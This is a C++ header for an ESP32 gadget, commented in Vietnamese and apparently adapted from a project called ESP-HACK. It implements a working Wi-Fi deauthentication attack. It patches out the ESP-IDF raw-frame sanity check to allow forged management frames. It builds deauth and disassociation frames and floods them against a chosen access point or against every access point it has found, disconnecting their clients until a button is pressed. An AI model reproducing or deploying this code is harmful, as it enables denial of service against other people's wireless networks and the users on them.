#pragma once

#include "utils.hpp"

// ============================================================
// WSL BYPASS (tu ESP-HACK) - cho phep gui raw management frame
// tren cac phien ban ESP-IDF/Arduino core moi
// ============================================================
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    if (arg == 31337) return 1;
    return 0;
}

// Frame mau: 802.11 Management Frame
// Offset: 0 FC | 2 Duration | 4 DA | 10 SA | 16 BSSID | 22 Seq | 24 Reason
static const uint8_t deauth_frame_template[] = {
    0xC0, 0x00,                         // Frame Control: Deauthentication
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence Control
    0x07, 0x00                          // Reason Code 7 (Class 3 frame received from nonassociated STA)
};

// Khoi tao WiFi cho deauth (theo ESP-HACK)
// STA mode + promiscuous + tat power save + max tx power
void WiFi_InitDeauth()
{
    WiFi_Init(); // dam bao esp_wifi da duoc init

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    WiFi.disconnect(true);
    delay(100);

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(50);

    esp_wifi_set_promiscuous(true);
    wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous_filter(&filt);

    esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
    esp_wifi_set_ps(WIFI_PS_NONE);
    esp_wifi_set_max_tx_power(78);
}

bool WiFi_SendRawFrame(const uint8_t* frame_buffer, int size)
{
    return esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false) == ESP_OK;
}

// Gui 1 frame deauth/disassoc toi 1 muc tieu cu the
void WiFi_SendDeauthFrame(
    uint8_t chan,
    const uint8_t* receiverMAC,
    const uint8_t* sourceMAC,
    const uint8_t* bssidMAC,
    uint8_t frame_type = 0xC0,   // 0xC0 = Deauth, 0xA0 = Disassoc
    uint16_t reason = 0x0007
)
{
    if (esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
        return;
    }

    uint8_t frame[sizeof(deauth_frame_template)];
    memcpy(frame, deauth_frame_template, sizeof(deauth_frame_template));

    frame[0] = frame_type;
    memcpy(frame + 4,  receiverMAC, 6);  // DA
    memcpy(frame + 10, sourceMAC,   6);  // SA
    memcpy(frame + 16, bssidMAC,    6);  // BSSID

    // Sequence number ngau nhien (giong ESP-HACK)
    uint16_t seqNum = (uint16_t)(random(0, 4096) << 4);
    frame[22] = seqNum & 0xFF;
    frame[23] = (seqNum >> 8) & 0xFF;

    frame[24] = reason & 0xFF;
    frame[25] = (reason >> 8) & 0xFF;

    for (int i = 0; i < 4; i++) {
        WiFi_SendRawFrame(frame, sizeof(frame));
        delay(1);
    }
}

// Tan cong 1 AP: gui ca 2 chieu, ca deauth lan disassoc
void WiFi_AttackAP(const uint8_t* bssid, uint8_t chan)
{
    static const uint8_t broadcastMAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    // AP -> Broadcast (ngat toan bo client dang ket noi)
    WiFi_SendDeauthFrame(chan, broadcastMAC, bssid, bssid, 0xC0, 0x0007);
    WiFi_SendDeauthFrame(chan, broadcastMAC, bssid, bssid, 0xA0, 0x0007);

    // Broadcast -> AP (mot so AP/router nhay voi frame nay)
    WiFi_SendDeauthFrame(chan, bssid, broadcastMAC, bssid, 0xC0, 0x0007);
    WiFi_SendDeauthFrame(chan, bssid, broadcastMAC, bssid, 0xA0, 0x0007);
}

void WiFi_DeauthAP(const uint8_t* bssid, String ap_name, uint8_t chan = 1)
{
    WiFi_InitDeauth();

    int packets = 0;

    while (!ReadButton(BUTTON_CENTER))
    {
        WiFi_AttackAP(bssid, chan);
        packets += 4;

        String text = ap_name;
        String text2 = "Packets: " + String(packets);
        String text3 = "Press CENTER to stop";

        display.clearDisplay();
        display.drawRect(0, 0, display.width(), display.height(), WHITE);
        display.setTextSize(1);
        display.setTextColor(WHITE);
        display.setCursor(4, 6);
        display.print(text);
        display.setCursor(4, 20);
        display.print(text2);
        display.setCursor(4, 40);
        display.print(text3);
        display.display();

        delay(10);
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    HaltTillRelease(BUTTON_CENTER);
}

// Chuc nang moi tu ESP-HACK: deauth TAT CA AP tim duoc
void WiFi_DeauthAll(const std::vector<APRecord>& aps)
{
    if (aps.empty()) return;

    WiFi_InitDeauth();

    int packets = 0;

    while (!ReadButton(BUTTON_CENTER))
    {
        for (auto& ap : aps)
        {
            if (ReadButton(BUTTON_CENTER)) break;
            WiFi_AttackAP(ap.bssid, ap.channel);
            packets++;
        }

        display.clearDisplay();
        display.drawRect(0, 0, display.width(), display.height(), WHITE);
        display.setTextSize(1);
        display.setTextColor(WHITE);
        display.setCursor(4, 6);
        display.print("Deauth ALL (" + String(aps.size()) + " APs)");
        display.setCursor(4, 20);
        display.print("Packets: " + String(packets));
        display.setCursor(4, 40);
        display.print("Press CENTER to stop");
        display.display();

        delay(10);
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    HaltTillRelease(BUTTON_CENTER);
}